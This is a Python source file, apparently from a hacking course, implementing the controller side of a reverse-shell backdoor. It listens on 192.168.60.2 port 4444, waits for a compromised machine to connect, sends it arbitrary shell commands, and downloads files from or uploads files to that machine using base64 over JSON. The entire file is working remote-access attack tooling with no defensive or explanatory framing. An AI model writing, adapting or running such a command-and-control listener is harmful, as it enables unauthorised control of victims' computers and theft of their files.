import socket, json, base64

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection from {str(address)}")
    
    def reliable_send(self, data):
        # Check if data is bytes (file content), if so, encode it
        if isinstance(data, bytes):
            data = base64.b64encode(data).decode('utf-8')  # Base64 encode bytes to string
        json_data = json.dumps(data)  # Serialize data to JSON
        self.connection.send(json_data.encode())  # Send data as JSON
    
    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                # Add a timeout or ensure we are continuously reading in chunks
                chunk = self.connection.recv(1024).decode()
                if chunk: 
                    json_data += chunk
                    # Try to decode if we have the complete JSON
                    return json.loads(json_data)
            except ValueError:
                continue  # Keep trying to receive more data

    def execute_remotely(self, command):
        self.reliable_send(command)  # Send the command
        return self.reliable_receive()  # Receive the result
    
    def read_file(self, path):
        # Read the file as bytes and base64 encode it before returning
        with open(path, 'rb') as file:
            return base64.b64encode(file.read()).decode('utf-8')

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))  # Decode from base64 and write to file
            return '[+] Download successful.'

    def run(self):
        while True:
            command = input("Enter cmd >> ")
            command = command.split(" ")  # Split input into command and arguments
            if command[0] == "exit":
                self.reliable_send(command)
                break
            elif command[0] == "download" and len(command) > 1:
                result = self.execute_remotely(command)
                result = self.write_file(command[1], result)
                print(result)
            elif command[0] == "upload" and len(command) > 1:
                file_content = self.read_file(command[1])  # Read and encode file content
                command.append(file_content)  # Append the base64-encoded content to the command
                result = self.execute_remotely(command)
                print(result)
            else:
                result = self.execute_remotely(command)
                print(result)
        self.connection.close()

my_listener = Listener("192.168.60.2", 4444)
my_listener.run()
